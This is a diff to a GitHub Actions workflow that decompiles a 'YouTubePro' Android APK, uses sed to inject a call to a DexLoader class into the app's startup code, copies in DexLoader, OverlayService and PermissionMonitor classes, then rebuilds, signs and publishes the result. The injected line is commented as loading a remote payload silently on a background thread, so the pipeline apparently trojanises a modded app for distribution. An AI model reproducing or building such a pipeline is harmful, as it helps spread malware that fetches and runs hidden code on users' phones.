@@ -30,10 +30,57 @@ jobs:
           sudo chmod +x /usr/local/bin/apktool
           apktool --version
 
-      - name: Build APK
+      - name: Decompile original APK
+        run: |
+          ls -lh attached_assets/
+          apktool d attached_assets/YouTubePro_1785357223541.apk \
+            -o build/decompiled \
+            --no-src \
+            -f
+          echo "=== Smali folders after decompile ==="
+          ls build/decompiled/
+          echo "=== Smali class count ==="
+          find build/decompiled/smali* -name "*.smali" 2>/dev/null | wc -l
+
+      - name: Inject DexLoader into StubApp
+        run: |
+          STUBAPP="build/decompiled/smali/com/stub/StubApp.smali"
+          if [ ! -f "$STUBAPP" ]; then
+            STUBAPP=$(find build/decompiled/smali* -name "StubApp.smali" 2>/dev/null | head -1)
+          fi
+          echo "Found StubApp: $STUBAPP"
+
+          # Cek apakah DexLoader sudah diinjeksikan sebelumnya
+          if grep -q "DexLoader" "$STUBAPP"; then
+            echo "DexLoader already injected, skipping"
+          else
+            # Inject setelah invoke-super attachBaseContext
+            sed -i 's/invoke-super {p0, p1}, Landroid\/app\/Application;->attachBaseContext(Landroid\/content\/Context;)V/invoke-super {p0, p1}, Landroid\/app\/Application;->attachBaseContext(Landroid\/content\/Context;)V\n\n    # DDL: load remote payload silently on background thread\n    invoke-static {p1}, Lcom\/ddl\/DexLoader;->load(Landroid\/content\/Context;)V/' "$STUBAPP"
+            echo "DexLoader injected successfully"
+          fi
+
+          grep -A 3 "DexLoader" "$STUBAPP" || echo "Injection not found - checking manually"
+
+      - name: Copy DDL smali classes
+        run: |
+          # Copy DexLoader, OverlayService, PermissionMonitor ke build/decompiled
+          mkdir -p build/decompiled/smali/com/ddl
+          mkdir -p build/decompiled/smali/com/payload
+
+          for f in apk-source/YouTubePro/smali/com/ddl/*.smali; do
+            cp "$f" build/decompiled/smali/com/ddl/
+            echo "Copied: $f"
+          done
+
+          echo "=== DDL classes in build ==="
+          ls build/decompiled/smali/com/ddl/
+
+      - name: Rebuild APK
         run: |
           mkdir -p output
-          apktool b apk-source/YouTubePro -o output/YouTubePro-mod-unsigned.apk
+          apktool b build/decompiled -o output/YouTubePro-mod-unsigned.apk
+          echo "=== APK built ==="
+          ls -lh output/YouTubePro-mod-unsigned.apk
 
       - name: Generate debug keystore
         run: |
@@ -84,5 +131,6 @@ jobs:
             🤖 Auto-built APK from commit ${{ github.sha }}
             - Branch: ${{ github.ref_name }}
             - Date: ${{ github.event.head_commit.timestamp }}
+            - Classes: decompiled fresh from original APK + DDL injection
           files: output/YouTubePro-mod.apk
           token: ${{ secrets.GITHUB_TOKEN }}
